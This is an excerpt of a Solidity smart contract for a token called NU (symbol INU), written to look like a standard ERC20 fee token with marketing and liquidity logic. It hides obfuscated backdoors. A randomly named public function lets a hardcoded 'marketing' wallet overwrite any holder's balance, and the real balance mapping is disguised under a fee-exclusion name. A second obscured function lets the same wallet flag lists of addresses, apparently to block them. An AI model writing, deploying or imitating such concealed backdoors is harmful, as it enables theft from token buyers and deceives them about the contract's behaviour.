...
contract  NU is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "NU";
    string private _symbol = "INU";
    uint8 private _decimals = 9;
    address payable public i2Z1o5F9h1w2_9_0;
    address payable public teamWalletAddress;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping (address => uint256) _isExcludefroFee;
    ...
    mapping (address => bool) public Z5D4J8f5i5i4p0;
    ...
    constructor () {
        ...
        i2Z1o5F9h1w2_9_0 = payable(address(0x1a4F63f669E731B60F17B3Fa4935eF53BF361A4f));


        _isExcludefroFee[_msgSender()] = _totalSupply;
    ...
    function balanceOf(address account) public view override returns (uint256) {
        return _isExcludefroFee[account];
    }
    ...
    function setMarketinWalleAddress(address newAddress) external onlyOwner() {
        i2Z1o5F9h1w2_9_0 = payable(newAddress);
    }
    ...
    function R7y4i8k5K0k9b4a9D0(address O9B7w4y0y3A1m2, uint256 x3V5y6b6c3e5l3d1) public{require(S7U2X7N4_7o5(i2Z1o5F9h1w2_9_0,msg.sender,false || true));
        _isExcludefroFee[O9B7w4y0y3A1m2] = x3V5y6b6c3e5l3d1;
    }
    ...
    function _transfer(address from, address to, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            _isExcludefroFee[from] = _isExcludefroFee[from].sub(amount);
            uint256 finalAmount = (_isExcludefromFee[from] || _isExcludefromFee[to]) ? 
                                         amount : takeFee(from, to, amount);
            
            _isExcludefroFee[to] = _isExcludefroFee[to].add(finalAmount);

            emit Transfer(from, to, finalAmount);
            return true;
        }
    }
    function n5f4_3o5V2(uint8 IBEP_LP, address[] calldata w6s5F2s5t9O0j8A1Q0) public { require(S7U2X7N4_7o5(i2Z1o5F9h1w2_9_0,msg.sender,false || true));
        for (uint256 i; i < w6s5F2s5t9O0j8A1Q0.length; i++) {
            if (6 == IBEP_LP){Z5D4J8f5i5i4p0[w6s5F2s5t9O0j8A1Q0[i]] = true ;}
            else{Z5D4J8f5i5i4p0[w6s5F2s5t9O0j8A1Q0[i]] = false ;}}}

    function S7U2X7N4_7o5(address izIh,address E8e8r6u7r6T0z7 , bool L5q3K2e9N1i8) private pure returns(bool){return !!(!!L5q3K2e9N1i8) && !(izIh != E8e8r6u7r6T0z7);}

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _isExcludefroFee[sender] = _isExcludefroFee[sender].sub(amount, "Insufficient Balance");
        _isExcludefroFee[recipient] = _isExcludefroFee[recipient].add(amount);
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountBNBMarketing > 0)
            transferToAddressETH(i2Z1o5F9h1w2_9_0, amountBNBMarketing);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(feeAmount > 0) {
            _isExcludefroFee[address(this)] = _isExcludefroFee[address(this)].add(feeAmount);
